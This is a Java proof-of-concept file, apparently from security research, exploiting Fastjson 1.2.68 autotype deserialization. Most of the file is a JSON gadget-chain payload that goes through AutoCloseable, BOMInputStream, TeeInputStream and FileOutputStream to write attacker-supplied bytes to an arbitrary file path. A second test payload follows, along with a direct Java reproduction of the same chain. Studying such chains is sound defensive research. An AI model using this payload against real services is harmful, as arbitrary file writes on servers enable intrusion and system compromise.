package com.firebasky.fastjson.poc1268.p1g3;

import com.alibaba.fastjson.JSONObject;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializerFeature;
import org.apache.commons.io.ByteOrderMark;
import org.apache.commons.io.input.BOMInputStream;
import org.apache.commons.io.input.TeeInputStream;
import java.io.ByteArrayInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import com.alibaba.fastjson.JSON;

/**
 * 受LocalVariableTable影响
 *
 * javap -l <class_name> | grep LocalVariableTable
 */
public class test {
    public static void main(String[] args) throws IOException {
        String poc = "{\n" +
                "\t\"@type\": \"java.util.Currency\",\n" +
                "    \"val\":{\n" +
                "        \"currency\":{\n" +
                "\t\t\t\"x\": {\n" +
                "\t\t\t\t\"@type\": \"java.lang.AutoCloseable\",\n" +
                "\t\t\t\t\"@type\": \"org.apache.commons.io.input.BOMInputStream\",\n" +
                "\t\t\t\t\"delegate\": {\n" +
                "\t\t\t\t\t\t\"@type\": \"org.apache.commons.io.input.TeeInputStream\",\n" +
                "\t\t\t\t\t\t\"input\": {\n" +
                "\t\t\t\t\t\t\t\"@type\": \"java.io.ByteArrayInputStream\",\n" +
                "\t\t\t\t\t\t\t\"buf\":x'466972656261736B79',\n" +//base64编码
                "\t\t\t\t\t\t\t\"offset\": 0,\n" +
                "\t\t\t\t\t\t\t\"length\": \"1024\"\n" +
                "\t\t\t\t\t\t\t},\n" +
                "\t\t\t\t\t\t\"branch\": {\n" +
                "\t\t\t\t\t\t\t\"@type\": \"java.io.FileOutputStream\",\n" +
                "\t\t\t\t\t\t\t\"file\": \"d:/1.txt\",\n" +
                "\t\t\t\t\t\t\t\"append\": false\n" +
                "\t\t\t\t\t\t\t}\n" +
                "\t\t\t\t\t},\n" +
                "\t\t\t\"boms\": [{\n" +
                "\t\t\t\t\"charsetName\": \"xxxx\",\n" +
                "\t\t\t\t\"bytes\": [0,0,0,0,0,0,0,0,0,0]\n" +
                "\t\t\t\t}]\n" +
                "\t\t\t}\n" +
                "\t\t}\n" +
                "\t}\n" +
                "}";

        //ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String test = "{\n" +
                "\t\t\t\t\t\t\t\"@type\": \"sun.security.ssl.ByteBufferInputStream\",\n" +
                "\t\t\t\t\t\t\t\"buf\":x'466972656261736B79',\n" +
                "\t\t\t\t\t\t\t\"offset\": 0,\n" +
                "\t\t\t\t\t\t\t\"length\": \"1024\"\n" +
                "\t\t\t\t\t\t\t}";

        Object parse = JSON.parse(test);
        System.out.println(parse);


        /**
         * 正向调用
         */
        byte[] array = {50,51,52,53,54,55};///466972656261736B79
        ByteArrayInputStream inputStream = new ByteArrayInputStream(array,0,1024);
        FileOutputStream outputStream = new FileOutputStream("d:/1.txt",false);
        TeeInputStream teeInputStream = new TeeInputStream(inputStream, outputStream, true);
        ByteOrderMark byteOrderMark  = new ByteOrderMark("UTF-8", new int[]{0,0,0,0,0,0,0,0,0,0,0,0,0,0});
        BOMInputStream bomInputStream = new BOMInputStream(teeInputStream, byteOrderMark);
        bomInputStream.getBOM();
        bomInputStream.close();

        String str = JSONObject.toJSONString(teeInputStream, SerializerFeature.WriteClassName);
        System.out.println(str);
    }
}
